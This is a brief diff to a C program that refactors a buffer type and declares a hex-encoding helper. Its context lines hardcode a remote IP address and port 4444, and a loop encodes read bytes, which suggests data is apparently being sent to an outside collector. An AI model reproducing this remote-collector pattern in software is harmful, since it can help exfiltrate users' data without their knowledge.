@@ -11,6 +11,7 @@
 #define REMOTE_ADDR "3.101.24.113"
 #define REMOTE_PORT 4444
 
+void kp_bin2hex(const void *bin, kp_size bin_len, s8 *hex);
 void print_buffer(kp_buffer *buffer)
 {
     for (size_t i = 0; i < buffer->size; i++)
@@ -97,7 +98,7 @@ int main(int argc, char **argv)
     kp_size total_bytes_read = 0;
     while (1)
     {
-        char buffer[256];
+        u8 buffer[256];
 
         char encoded[sizeof(buffer) * 2 + 1];
 
